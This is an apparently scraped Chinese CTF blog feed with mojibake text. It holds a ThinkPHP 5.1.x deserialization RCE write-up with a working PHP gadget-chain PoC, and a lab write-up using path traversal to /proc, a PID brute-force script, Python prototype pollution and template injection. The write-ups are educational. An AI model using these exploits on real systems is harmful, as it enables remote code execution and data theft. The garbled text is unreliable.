å…¥çš„å½¢å¼å‚æ•°$dataæ•°ç»„ä¸­é”®ä¸ºå½¢å¼å‚æ•°$nameçš„å€¼è¿”å›, åœ¨è¿™é‡Œå³ä¸ºè¿”å›getè¯·æ±‚æ•°æ®ä¸­é”®ä¸º$this-&gt;config[â€˜var_ajaxâ€™]çš„å€¼</p><p>ä¸å¦¨è®¾ç½®:</p><p>$this-&gt;config &#x3D; [â€˜var_ajaxâ€™ &#x3D;&gt; â€˜naclâ€™]; </p><p>è¿™æ ·, $dataå°±å˜æˆäº†getè¯·æ±‚ä¸­é”®ä½naclçš„å€¼</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135222503.png" alt="image-20240306135222503"></p><p>è¿™é‡Œ$dataå°±å·²ç»å˜æˆæˆ‘ä»¬è®¾ç½®çš„å­—ç¬¦ä¸²äº†</p><p>ä¹‹åè·Ÿè¿›getFilter()æ–¹æ³•æ¥è®¾ç½®ä¹‹å‰å·²çŸ¥è¢«èµ‹å€¼ä¸ºé»˜è®¤å€¼çš„$filter</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135657139.png" alt="image-20240306135657139"></p><p>è¿™é‡Œå°†è¦è¿”å›çš„å€¼$filteré»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸², ä¹‹åä¼šè¢«èµ‹å€¼ä¸º$this-&gt;filter, å¹¶ä¸”è¿½åŠ äº†ä¸€ä¸ªé»˜è®¤å€¼$default2ä¸ºnullå¹¶è¿”å›</p><p>ä¹‹åè·³åˆ°:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135953679.png" alt="image-20240306135953679"></p><p>è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306140016138.png" alt="image-20240306140016138"></p><p>zhe</p><p>å¯ä»¥çœ‹è§ä¼ å…¥çš„å®å‚$filteræ˜¯è¦æ‰§è¡Œçš„ä»»æ„å‡½æ•°, ä¼ å…¥çš„å®å‚$dataè¦æ‰§è¡Œçš„ä»»æ„å‡½æ•°çš„å‚æ•°</p><p>é‚£ä¹ˆ, $this-&gt;filterå°±æ˜¯è¦æ‰§è¡Œçš„ä»»æ„å‡½æ•°</p><p>$this-&gt;filter &#x3D; â€œsystemâ€;</p><p>æœ€ç»ˆpoc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;nacl&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;nacl&#x27;</span> =&gt; [<span class="string">&#x27;nacl&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>]];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$config</span> = [];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;config = [<span class="string">&#x27;var_ajax&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141151590.png" alt="image-20240306141151590"></p><p>è¿™é‡Œä¼šæŠŠ$filtersæ•°ç»„æœ«å°¾çš„nullå¼¹å‡º, ä¹‹åå°±æˆåŠŸrce</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141253331.png" alt="image-20240306141253331"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141316024.png" alt="image-20240306141316024"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ThinkPHP-5-1-xååºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#ThinkPHP-5-1-xååºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP 5.1.xååºåˆ—åŒ–&quot;&gt;&lt;/a&gt;ThinkPHP 5.1.xååºåˆ—åŒ–&lt;/h1&gt;&lt;p&gt;æˆ‘ä»¬å·²ç»å­¦ä¹ </summary>
      
    
    
    
    
    <category term="ThinkPHPååºåˆ—åŒ–" scheme="http://example.com/tags/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHPå­¦ä¹ </title>
    <link href="http://example.com/2024/03/04/ThinkPHP%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/03/04/ThinkPHP%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-03-04T04:45:07.000Z</published>
    <updated>2024-03-04T14:27:09.368Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133155049.png"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133210500.png" alt="image-20240304133210500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133155049.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Swagger docs</title>
    <link href="http://example.com/2024/03/01/%E5%AE%89%E6%B4%B5%E6%9D%AFSwagger-docs/"/>
    <id>http://example.com/2024/03/01/%E5%AE%89%E6%B4%B5%E6%9D%AFSwagger-docs/</id>
    <published>2024-03-01T13:05:49.000Z</published>
    <updated>2024-03-02T14:26:13.743Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Swagger-docs"><a href="#Swagger-docs" class="headerlink" title="Swagger docs"></a>Swagger docs</h1><p>ä¸€è¿›å»æ˜¯ä¸€ä¸ªæ–‡æ¡£å†…å®¹, è¿˜ä»¥ä¸ºæ˜¯å®¹å™¨æ²¡å¼„å¥½</p><p>ä»”ç»†çœ‹åƒæ˜¯ä¸€äº›apiçš„æ–‡æ¡£,çœ‹ä¸æ‡‚,ä½†æ˜¯æ²¡å…³ç³», ç›´æ¥æ‰”ç»™gpt, è®©ä»–ä¸¾å‡ºå‡ ä¸ªè¯·æ±‚çš„ä¾‹å­</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301211339462.png" alt="image-20240301211339462"></p><p>è¿™é‡Œæœ‰å››æ¡apiæ¥å£, ç®€å•æµè§ˆä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/api-base/v0/register</span><br><span class="line">#æ³¨å†Œ</span><br><span class="line">/api-base/v0/login</span><br><span class="line">#ç™»å½•</span><br><span class="line">/api-base/v0/update</span><br><span class="line">#ä¿®æ”¹å¯†ç </span><br><span class="line">/api-base/v0/search</span><br><span class="line">#æœç´¢æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>ç”±äºå·²ç»çŸ¥é“æ˜¯åŸå‹é“¾æ±¡æŸ“, å…¶å®å¯ä»¥çŒœæµ‹ä¸€ä¸‹</p><ol><li><p>ä¿®æ”¹ç§˜å¯†çš„åœ°æ–¹å¯ä»¥è¿›è¡Œæ±¡æŸ“, å½“ç„¶æ³¨å†Œçš„åœ°æ–¹ä¹Ÿæœ‰ä¸€ä¸ªæ’å…¥çš„æ“ä½œ, ä¹Ÿå¯èƒ½å­˜åœ¨æ±¡æŸ“</p></li><li><p>æœç´¢æ–‡ä»¶çš„åœ°æ–¹å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶, è¯»å–appçš„æºç </p></li></ol><p>å½“ç„¶è¿™åªæ˜¯çŒœæµ‹</p><p>å…ˆé€šè¿‡apiæ³¨å†Œç™»å½•è·å¾—token</p><p>è¿™é‡Œçš„tokenä¸€çœ¼jwt è§£ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301214129531.png" alt="image-20240301214129531"></p><p>è¿™é‡Œä¼šç›´æ¥æŠŠå¯†ç ä¹Ÿå­˜åœ¨é‡Œé¢äº†, ä½†æ˜¯å¹¶ä¸çŸ¥é“ç§é’¥,å¹¶ä¸”çˆ†ç ´ä¸å‡ºæ¥,ä¸èƒ½è¿›è¡Œä¼ªé€ </p><p>tokenå…ˆæ”¾ä¸€æ”¾</p><p>ç®€å•å°è¯•è¿™ä¸ªsearchçš„apiåå‘ç°ç¡®å®å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301212720010.png" alt="image-20240301212720010"></p><p>è¿™é‡Œå¹¶ä¸èƒ½ä½¿ç”¨é€šé…ç¬¦, ä¹Ÿè¯»ä¸åˆ°app.py config.py web.pyè¿™æ ·çš„æºç </p><p>æˆ–è®¸åº”è¯¥å¯»æ‰¾æºç çš„æ–‡ä»¶å</p><p>å¯è°“æ˜¯ç™¾æ€ä¸å¾—å…¶è§£, ç–‘æƒ‘ä¹‹ä¸‹google ç®€å•æœç´¢äº†ä¸€ä¸‹ è¯æ¡ â€œflaskæºæ–‡ä»¶è¯»å–â€</p><p><strong>æŸ³æš—èŠ±æ˜åˆä¸€æ‘</strong></p><p>æˆ‘å‘ç°äº†è¿™ç¯‡æ–‡ç« </p><p><a href="https://wycisme.gitee.io/2021/04/21/CTF-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://wycisme.gitee.io/2021/04/21/CTF-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cmdlineè¿™ä¸ªæ–‡ä»¶æ¥å¾—åˆ°å½“å‰è¿è¡Œçš„ç¨‹åº</p><blockquote><p>  proc ç›®å½•é€šå¸¸å­˜å‚¨ç€è¿›ç¨‹åŠ¨æ€è¿è¡Œçš„å„ç§ä¿¡æ¯ï¼Œæ˜¯ä¸€ç§è™šç›®å½• ã€&#x2F;proc&#x2F;[pid]&#x2F;  è¡¨ç¤ºå­˜å‚¨è¿™è¿›ç¨‹idä¸ºpid çš„ è¿›ç¨‹ä¿¡æ¯ï¼Œå½“å‰è¿›ç¨‹ pid ç”¨self ä»£æ›¿ï¼Œå³ &#x2F;proc&#x2F;self&#x2F;.</p><pre><code>    /proc/[pid]/cmdline ä¸‹å¯è¯»å‡ºè¿›ç¨‹åœ¨ç»ˆç«¯è¾“å…¥è¿‡çš„å‘½ä»¤å‘½ä»¤ </code></pre></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301222256761.png" alt="image-20240301222256761"></p><p>è¿™ä¸‹å°±å¯ä»¥ç›´æ¥è¯»å–æºæ–‡ä»¶äº†</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301222546644.png" alt="image-20240301222546644"></p><p>api.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/v2/users&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_info</span>():</span><br><span class="line">    file_path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> file_path:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file_content = file.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">id</span>:</span><br><span class="line">                    data = json.loads(file_content)</span><br><span class="line">                    <span class="keyword">for</span> user <span class="keyword">in</span> data[<span class="string">&#x27;users&#x27;</span>]:</span><br><span class="line">                        <span class="keyword">if</span> user[<span class="string">&#x27;id&#x27;</span>] == <span class="built_in">int</span>(<span class="built_in">id</span>):</span><br><span class="line">                            <span class="keyword">if</span> user:</span><br><span class="line">                                <span class="keyword">return</span> user</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">            <span class="keyword">return</span> file_content</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>,<span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">8899</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªæœ‰api.pyçš„æºç , ä½†æ˜¯å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„</p><p>è¿™é‡Œ&#x2F;proc&#x2F;[pid]&#x2F;cmdline</p><p>æ—¢ç„¶è¿™ä¸ªæ˜¯pidè¿›ç¨‹, ç†è®ºä¸Šè¿›ç¨‹æ•°æœ€å¤§å€¼ä¸º32768, æˆ‘ä»¬å¯ä»¥å†™ä¸ªè„šæœ¬å°è¯•çˆ†ç ´ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.26:22401//api-base/v0/search?file=../../../../../proc/&#123;&#125;/cmdline&amp;type=text&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiJ9.bzD2zo_oMqcmwR5IS_KWlaVChT30zADxFY-wxv91gFo;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32769</span>):</span><br><span class="line">    payload = url.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">    res = requests.get(url=payload, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;python&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(parse.quote(res.text))</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python%00api.py%00</span><br><span class="line">8</span><br><span class="line">python%00app.py%00</span><br><span class="line">9</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå´åˆçˆ†å‡ºæ¥äº†app.pyä½†æ˜¯å¹¶ä¸èƒ½æŠŠä»–è¯»å–å‡ºæ¥â€¦ </p><p>ä¸çŸ¥é“æ˜¯å¦æ˜¯å› ä¸ºæƒé™é—®é¢˜</p><p>å›å¤´çœ‹äº†ä¸‹api.pyçš„æºç , è¿™é‡Œé¢çš„è·¯ç”±ä¸º&#x2F;v2&#x2F;usersè€Œä¸æ˜¯ä¸€å¼€å§‹è¯»æ–‡ä»¶çš„è·¯ç”±&#x2F;api-base&#x2F;v0&#x2F;search</p><p>ä½†æ˜¯ä¹Ÿè®¿é—®ä¸åˆ°&#x2F;v2&#x2F;usersè¿™æ¡è·¯ç”±</p><p>è¿™é‡Œæ€ä¹ˆä¹Ÿè¯»å–ä¸åˆ°, ç”¨é¢˜è§£é‡Œçš„æ–¹æ³•ä¹Ÿä¸è¡Œ, ç”±harderå­¦é•¿çš„æç¤ºå°±ç›´æ¥çœ‹æºç äº†</p><p>åœ¨ä¿®æ”¹å¯†ç çš„è·¯ç”±ä¸‹è°ƒç”¨äº†ä¸€ä¸ªupdateå‡½æ•°,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update(new_password, User)</span><br></pre></td></tr></table></figure><p> è·Ÿè¿›ä¼šå‘ç°è¿™æ­£æ˜¯ä¸€ä¸ªç»å…¸çš„mergeå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):   <span class="comment"># merge Ô­ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¾</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> src:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                 <span class="keyword">if</span> key <span class="keyword">in</span> dst <span class="keyword">and</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                    update(src[key], dst[key])</span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     dst[key] = src[key]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[key] = src[key]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> src.items() :</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst,key) <span class="keyword">and</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>):</span><br><span class="line">                update(value,<span class="built_in">getattr</span>(dst, key))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">setattr</span>(dst, key, value)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°†new_passwordç›´æ¥åˆå¹¶åˆ°User</p><p>æˆ‘ä»¬è·Ÿè¿›Userçœ‹çœ‹çš„åŸå‹ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        self.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;password&quot;</span></span><br><span class="line">        self.token=jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: self.username, <span class="string">&#x27;password&#x27;</span>: self.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé‡è½½äº†_<em>init</em>_, é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡initæ¥æ±¡æŸ“äº†</p><p>ä½†æ˜¯flagåœ¨å“ªå¹¶ä¸çŸ¥é“</p><p>è¿™é‡Œå‘ç°åŠ è½½äº†osæ¨¡å—, é‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶ç¯å¢ƒå˜é‡, æˆ–è®¸flagå°±åœ¨ç¯å¢ƒå˜é‡ä¸­</p><p>è¿™é‡Œç®€å•å°è¯•ä¸€ä¸‹æ±¡æŸ“respone0</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302101737306.png" alt="image-20240302101737306"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302101751821.png" alt="image-20240302101751821"></p><p>å¯ä»¥çœ‹è§å·²ç»æ±¡æŸ“æˆåŠŸäº†</p><p>ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</p><p>ä»”ç»†è§‚å¯Ÿæºç å‘ç°searchçš„åœ°æ–¹ç”¨äº†ä¸€æ¬¡æ¸²æŸ“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(data.text)</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªdataæ¥æºäºapi.pyè¯»å–çš„æ–‡ä»¶å†…å®¹</p><p>ç¨å¾®è§‚å¯Ÿapi.py å¯ä»¥é¢„æµ‹åˆ°å½“å‰è¿˜å­˜åœ¨ä¸€ä¸ªuserçš„jsonæ–‡ä»¶</p><p>è¿™æ 